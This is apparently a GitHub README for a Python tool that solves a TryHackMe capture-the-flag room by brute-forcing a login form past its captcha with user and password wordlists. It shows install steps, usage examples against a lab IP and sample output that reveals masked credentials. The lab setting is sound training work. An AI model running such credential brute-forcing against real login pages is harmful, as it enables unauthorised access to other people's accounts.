# Capture! ByPass (TryHackme CTF)

<p align="center"><img src="images/capture-logo.png" alt="vkm-logo" style='width:150px;height:150px;'></p>


<div align="center">
    <img src="https://img.shields.io/badge/Code%20By%20CarlosPadilla-8338ec">
    <img src="https://img.shields.io/github/downloads/cpadlab/capture/total">
    <img src="https://img.shields.io/github/license/cpadlab/capture">
    <img src="https://img.shields.io/tokei/lines/github/cpadlab/capture">
    <img src="https://img.shields.io/github/stars/cpadlab/capture">
</div>

**Author**: Carlos Padilla (cpadlab)

**Download**: https://github.com/cpadlab/capture#Install

**Room Title**: Capture this!

**Room Link**: [URL](https://tryhackme.com/room/capture!)

**Room Author**: [toxicat0r](https://tryhackme.com/p/toxicat0r) && [https://tryhackme.com/p/tryhackme](tryhackme)


# Table of Contents

1. [Download](https://github.com/cpadlab/capture#Download)
2. [Usage](https://github.com/cpadlab/capture#Usage)
3. [Usage Example](https://github.com/cpadlab/capture#Example)
4. [Output](https://github.com/cpadlab/capture#Output)
5. [License](https://github.com/cpadlab/capture/LICENSE)


# Download

```
git clone https://github.com/cpadlab/capture/
cd capture/ && pip install -r requirements.txt

```

# Usage

```bash
┌──(cpadlab㉿seccon)-[~/capture]
└─$ python bypass.py --help  

usage: bypass.py [-h] [-p PASSLIST] [-u USERLIST] --url URL

CaptureByPass Args

options:
  -h, --help            show this help message and exit
  -p PASSLIST, --passlist PASSLIST
  -u USERLIST, --userlist USERLIST
  --url URL 
```

`--url URL` Is Required.

## Examples

```bash
python bypass.py --passlist passwords.txt --userlist usernames.txt --url 10.10.10.10
```

<details>
  <summary>See More</summary>

```bash
python bypass.py -p passwords.txt --u usernames.txt --url 10.10.10.10/login
```

```bash
python bypass.py -u usernames.txt --url http://10.10.10.10
```

```bash
python bypass.py -p passwords.txt --url http://10.10.10.10/login
```

```bash
python bypass.py --url http://10.10.10.10/login # http://10.10.10.10 or 10.10.10.10
```
    
</details>

# Output

```
==============================================
Capture!ByPass         Carlos Padilla (14wual)
==============================================
   _____                _                   _ 
  / ____|   /\         | |  ByPass Script  | |
 | |       /  \   _ __ | |_ _ __ _   _  ___| |
 | |      / /\ \ | '_ \| __| '__| | | |/ _ \ |
 | |____ / ____ \| |_) | |_| |  | |_| |  __/_|
  \_____/_/    \_\ .__/ \__|_|   \__,_|\___(_)
                 | |                          
                 |_| (Code by 14Wual)
==============================================
Author Web: https://cpadlab.github.io/
CTF Room: https://tryhackme.com/room/capture
==============================================
TARGET: http://10.10.206.228
==============================================
PassList Size: 1567
UserList Size: 878
==============================================
[Info] Started at: 30:01/2024 - 00:34:02
[Info] Captchat enabled.
[*] Trying Username: hunter with the test password.
...
[Info] Discovered username: n******.
[*] Trying Password: michaela for n******.
...
[Info] Discovered password: s***
==============================================
[CREDENTIALS] n******:s*******
==============================================
[Info] Opening New Browser Tab

```
